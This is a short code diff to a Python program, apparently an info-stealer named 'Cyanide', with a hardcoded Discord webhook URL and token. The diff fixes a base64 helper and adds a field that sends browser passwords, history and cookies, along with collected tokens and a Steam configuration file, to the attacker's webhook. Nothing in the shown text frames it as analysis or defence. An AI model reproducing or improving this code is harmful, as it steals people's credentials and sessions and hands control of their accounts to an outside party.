@@ -15,12 +15,12 @@ class Main:
     def __init__(self) -> None:
         self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide")
 
-    def convert2Base64(creds: list):
+    def convert2Base64(self, creds: list):
         dataBuffer = {}
         for cell in creds:
             dataBuffer.update(cell)
         
-        base64.b64encode(json.dumps(dataBuffer, indent=3).encode()).decode()
+        return base64.b64encode(json.dumps(dataBuffer, indent=3).encode()).decode()
 
     def browser(self):
         creds = []
@@ -118,7 +118,8 @@ class Main:
 
         embed = DiscordEmbed(title='Report')
         embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
-        self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamConfig.vdf")
+        embed.add_embed_field(name='Passwords/History/Cookies', value=f"""data:text/plain;base64,{self.convert2Base64(listCreds)}""")
+        self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamConfig.txt")
         self.webhook.add_embed(embed)
         r = self.webhook.execute()
 
